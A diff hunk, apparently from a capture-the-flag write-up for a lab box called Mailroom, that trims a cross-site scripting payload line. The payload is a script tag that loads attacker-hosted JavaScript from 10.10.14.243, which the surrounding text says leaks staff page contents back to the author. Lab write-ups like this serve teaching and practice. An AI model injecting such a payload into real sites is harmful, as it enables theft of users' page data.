@@ -162,7 +162,7 @@ We need to host it with a web server of some sort, I use a Python module.
 My XSS payload will just fetch this JS file from my host and give us the page contents after decoding:
 
 ```
-Please leak your staff pages! <script src= "http://10.10.14.243/staff_request.js"></script>
+<script src= "http://10.10.14.243/staff_request.js"></script>
 ```
 
 ![](../assets/img/2026-05-03-Mailroom/8.png)
